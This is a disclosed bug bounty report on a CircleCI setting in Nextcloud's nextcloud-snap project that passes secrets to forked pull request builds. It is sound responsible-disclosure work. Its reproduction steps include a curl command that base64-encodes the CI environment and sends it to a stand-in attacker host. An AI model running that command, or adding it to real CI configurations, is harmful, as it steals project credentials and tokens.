# nextcloud-snap CircleCI project has vulnerable configuration which can lead to exposing secrets

## Report Details
- **Report ID**: 794407
- **URL**: https://hackerone.com/reports/794407
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-02-12T11:08:18.357Z
- **Disclosed**: 2021-01-29T12:40:33.773Z

## Reporter
- **Username**: nathand
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
## Summary:
CircleCI allows projects to configure whether builds will run as a result of a pull request from a fork, and also whether these fork PRs have access to the secrets stored in the parent repo's CircleCI settings. When both settings are enabled, and the repo associated with the project allows PRs to come from forks from any user (which Github always allows), then a CircleCI project is vulnerable to leaking secrets. Please see the following for documentation on this:

https://circleci.com/docs/2.0/oss/#pass-secrets-to-builds-from-forked-pull-requests

Particularly:

> If you are comfortable sharing secrets with anyone who forks your project and opens a PR, you can enable the Pass secrets to builds from forked pull requests option

I believe the `nextcloud/nextcloud-snap` CircleCI project is configured in a vulnerable state, where both these settings are enabled. To determine this, I have developed an automated technique to query CircleCI projects for various non-sensitive settings including whether secrets are being passed to PRs from forks, although an attacker may be able to determine this by manually inspecting the build logs of fork PRs to the project for signs of credential use, or by simply doing a spray-n-pray, i.e., send in a malicious PR and hope for the best. You can confirm this by accessing the CircleCI dashboard, selecting the `nextcloud/nextcloud-snap` project, clicking on the Settings icon (right side, little cog icon), choosing "Advanced Settings", and scrolling down to "Build forked pull requests" (should be "On") and "Pass secrets to builds from forked pull requests" (should be "On").

Inspecting the `.circleci/config.yml` file for this repo suggests that there may not be any secret values being used, however if you go to a build job such as this one:

https://circleci.com/gh/nextcloud/nextcloud-snap/4537

Then expand the "Preparing Environment Variables" section, and scroll down to "Using environment variables from project settings and/or contexts", you can see that the CircleCI environment has access to `GH_AUTH_TOKEN`, which I'm assuming is a Github auth token. Assuming the worst, and this token grants a high level of access, its exposure using the technique outlined in this report could lead to malicious code being injected into Nextcloud repos, access to private repos etc.

FYI, utilizing CircleCI Contexts may have prevented this configuration from being an issue, however my analysis of the CircleCI config file in this report suggests that Contexts is not being used.

https://circleci.com/docs/2.0/contexts/

**Please note:** I did *not* submit any real pull requests to confirm this vulnerability, as I did not want to potentially tip off real attackers, as it would be hard to conduct a proof of concept in a public PR without also risking revealing the vulnerability. However my testing on CircleCI is fairly conclusive that these two configuration settings being enabled are vulnerable.

With that said, I'm willing to help prove this vulnerability in a more private environment, such as a private Nextcloud Github repository that is configured for CircleCI builds with the same vulnerable configuration outlined in this, which I have access to submit PRs to. The permission model on Github really has no bearing on this vulnerability from what I can tell, so I believe this would be a faithful representation of the vulnerability, without exposing the technique publicly. My Github username is `ndavison` if you wish to do this.

## Steps To Reproduce:

  1. Fork the `nextcloud/nextcloud-snap` repo to a user (e.g. so it ends up as https://github.com/USER/nextcloud-snap).
  1. Create a new branch in the fork, and modify the `.circleci/config.yml` file so environment variables are exfiltrated, e.g. add `- run: curl https://attacker.com/?env=$(env | base64 | tr -d '\n')` to a CircleCI step that is executed during the CI build.
  1. Send the branch in as a PR to `nextcloud/nextcloud-snap`.
  1. Watch the web logs on `attacker.com` and wait for the environment variables stored in the CircleCI `nextcloud/nextcloud-snap` project to arrive via the query string.

## Supporting Material/References:

  * Please see the attached screenshot (`circleci-vulnerable-config.png`) of the vulnerable configuration state (when visiting "Advanced Settings" for a project in the CircleCI dashboard)

## Impact

By abusing the CircleCI configuration for the project, an attacker would be able to leak environment variables, deployment keys, and other credentials stored within the CircleCI project's settings. In this case it looks like the project might have access to a Github access token.

## Attachments
- circleci-vulnerable-config.PNG
